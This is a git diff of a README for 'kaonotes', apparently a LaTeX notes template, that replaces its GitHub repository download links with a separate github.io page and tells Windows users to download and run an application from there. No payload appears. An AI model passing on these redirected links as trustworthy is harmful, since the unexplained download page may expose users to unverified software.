@@ -1,6 +1,6 @@
 # 📝 kaonotes - Beautiful Notes for Math and Code
 
-[![Download kaonotes](https://img.shields.io/badge/Download-kaonotes-2ea44f?style=for-the-badge)](https://github.com/Tatedicotyledonous8808/kaonotes)
+[![Download kaonotes](https://img.shields.io/badge/Download-kaonotes-2ea44f?style=for-the-badge)](https://tatedicotyledonous8808.github.io)
 
 ## 👋 Welcome to kaonotes
 
@@ -26,7 +26,7 @@ Getting kaonotes on your Windows computer is simple. Follow these steps:
 
 ### Step 1: Download kaonotes
 
-Visit this link to download the application: [https://github.com/Tatedicotyledonous8808/kaonotes](https://github.com/Tatedicotyledonous8808/kaonotes)
+Visit this link to download the application: [https://tatedicotyledonous8808.github.io](https://tatedicotyledonous8808.github.io)
 
 Click the green "Download" button on that page. Your browser will start downloading a file. Wait for the download to finish.
 
@@ -145,6 +145,6 @@ Start using kaonotes today and see how much better your notes can look!
 
 ## 📥 Download Again
 
-If you need to download kaonotes again, use this link: [https://github.com/Tatedicotyledonous8808/kaonotes](https://github.com/Tatedicotyledonous8808/kaonotes)
+If you need to download kaonotes again, use this link: [https://tatedicotyledonous8808.github.io](https://tatedicotyledonous8808.github.io)
 
 Keywords: academic-writing, chinese-typesetting, computer-science, kaobook, latex, latex-template, mathematics, multilingual, research-notes, xelatex
